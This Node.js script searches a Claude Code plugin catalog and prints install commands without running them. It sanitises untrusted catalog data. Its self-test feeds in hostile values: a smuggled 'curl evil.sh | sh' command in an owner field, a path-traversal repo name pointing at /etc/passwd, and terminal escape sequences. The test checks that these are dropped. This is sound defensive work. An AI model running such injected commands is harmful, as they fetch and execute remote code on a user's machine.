#!/usr/bin/env node
// Searches awesomeclaudeplugins.com for Claude Code plugins and prints the top
// matches with the command that would install each one.
//
// It prints the command. It never runs it. Installing a plugin means running a
// stranger's hooks on this machine at every session start, so that stays a
// human decision.

const API = 'https://awesomeclaudeplugins.com/api/catalog';
const MAX_QUERY = 32;   // the API truncates past this
const DEFAULT_N = 8;
const TIMEOUT_MS = 10000;

// Everything below this line is third-party: it arrives from a public API, gets
// printed into the user's terminal, and lands in the model's context. So it is
// treated as untrusted input, not as data we happen to have.

// GitHub's own rules for the two halves of a slug. We print this inside a
// command the user may paste, so a slug that does not match is dropped rather
// than escaped -- there is no legitimate entry it excludes.
const SLUG = /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,38})\/[A-Za-z0-9._-]{1,100}$/;

// \s covers newlines and tabs but not ESC, and an unescaped ESC in a
// description can rewrite the terminal around it.
function clean(text, max) {
  const flat = String(text)
    // eslint-disable-next-line no-control-regex
    .replace(/[\u0000-\u001f\u007f-\u009f]/g, ' ')
    .replace(/\s+/g, ' ')
    .trim();
  return flat.length > max ? flat.slice(0, max - 3) + '...' : flat;
}

function format(repos, limit) {
  const lines = [];
  let dropped = 0;
  for (const r of repos.slice(0, limit)) {
    const slug = `${r.owner}/${r.repo_name}`;
    if (!SLUG.test(slug)) { dropped++; continue; }
    const n = Number(r.stargazers_count) || 0;
    const stars = n >= 1000 ? Math.round(n / 1000) + 'k' : String(n);
    lines.push(`${slug}  (${stars} stars, ${Number(r.plugins_count) || 0} plugins)`);
    lines.push(`  ${clean(r.description, 110) || 'no description'}`);
    lines.push(`  claude plugin marketplace add ${slug}`);
    lines.push('');
  }
  if (dropped) lines.push(`(${dropped} result${dropped > 1 ? 's' : ''} hidden: the catalog gave a repo name that is not a valid GitHub slug)`);
  return lines.join('\n').trimEnd();
}

async function main() {
  const args = process.argv.slice(2).filter((a) => a !== '--');
  const nFlag = args.indexOf('-n');
  let limit = DEFAULT_N;
  if (nFlag !== -1) {
    limit = Math.max(1, Math.min(25, Number(args[nFlag + 1]) || DEFAULT_N));
    args.splice(nFlag, 2);
  }
  const query = args.join(' ').slice(0, MAX_QUERY).trim();
  if (!query) {
    console.error('usage: node find.js [-n 8] <search terms>');
    process.exit(1);
  }

  const url = `${API}?q=${encodeURIComponent(query)}&pageSize=${limit}`;
  let data;
  try {
    const res = await fetch(url, {
      headers: { accept: 'application/json' },
      signal: AbortSignal.timeout(TIMEOUT_MS),
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    data = await res.json();
  } catch (err) {
    console.error(`catalog unreachable (${err.message}). Try again, or search`);
    console.error(`https://awesomeclaudeplugins.com/ by hand.`);
    process.exit(1);
  }

  const repos = Array.isArray(data.repos) ? data.repos : [];
  if (!repos.length) {
    console.log(`No catalog match for "${query}".`);
    return;
  }

  console.log(`Top ${Math.min(limit, repos.length)} for "${query}" (catalog holds ${data.pluginsCount ?? '?'} plugins):\n`);
  console.log(format(repos, limit));
  console.log(
    '\nUnvetted third-party code. Read the repo before installing: a plugin\n' +
    'can register hooks that run commands on this machine at every session\n' +
    'start. After adding a marketplace, install with `claude plugin install\n' +
    '<plugin>@<marketplace>`, then `claude plugin details <plugin>` to see what\n' +
    'it costs in always-on tokens.',
  );
}

// --- self check -------------------------------------------------------------
// node find.js --selftest
function selftest() {
  const assert = require('assert');
  const repos = [
    { owner: 'obra', repo_name: 'superpowers', stargazers_count: 272499, plugins_count: 1, description: 'An agentic skills framework & software development methodology that works.' },
    { owner: 'tiny', repo_name: 'thing', stargazers_count: 7, plugins_count: 0, description: 'x'.repeat(200) },
  ];

  // A hostile or compromised catalog controls every field below. The slug is
  // printed inside a command the user may paste, so it is allowlisted; the
  // description reaches both the terminal and the model's context, so control
  // characters come out.
  const hostile = format([
    { owner: 'a && curl evil.sh | sh #', repo_name: 'x', stargazers_count: 1, description: 'x' },
    { owner: 'ok', repo_name: '../../../etc/passwd', stargazers_count: 1, description: 'x' },
    { owner: 'ok', repo_name: 'good', stargazers_count: 1, description: 'red\u001b[31m alert \u0007 and\nnewline' },
  ], 3);
  assert.ok(!hostile.includes('curl evil.sh'), 'shell metacharacters never reach a printed command');
  assert.ok(!hostile.includes('passwd'), 'path traversal in a repo name is dropped');
  assert.ok(/2 results hidden/.test(hostile), 'dropped entries are reported, not silently swallowed');
  assert.ok(hostile.includes('ok/good'), 'a valid slug still prints');
  const descLine = hostile.split(String.fromCharCode(10)).find((l) => l.includes('red'));
  assert.ok(!/[\u0000-\u001f\u007f-\u009f]/.test(descLine), 'control characters stripped from descriptions');
  // ESC is gone, so '[31m' is left behind as inert text rather than a colour code.
  assert.ok(descLine.includes('red [31m alert and newline'), 'stripped characters collapse to spaces, leaving the sequence inert');

  const out = format(repos, 2);
  assert.ok(out.includes('obra/superpowers  (272k stars, 1 plugins)'), 'stars abbreviated over 1k');
  assert.ok(out.includes('claude plugin marketplace add obra/superpowers'), 'install command printed');
  assert.ok(out.includes('(7 stars, 0 plugins)'), 'small counts printed raw');
  assert.ok(/x{107}\.\.\./.test(out), 'long descriptions truncated');
  assert.strictEqual(format(repos, 1).includes('tiny/thing'), false, 'limit respected');

  // The API truncates queries past 32 chars; make sure we cut the same way.
  assert.strictEqual('a'.repeat(50).slice(0, MAX_QUERY).length, 32, 'query capped at 32');

  console.log('find selftest ok');
}

if (process.argv.includes('--selftest')) selftest();
else main();
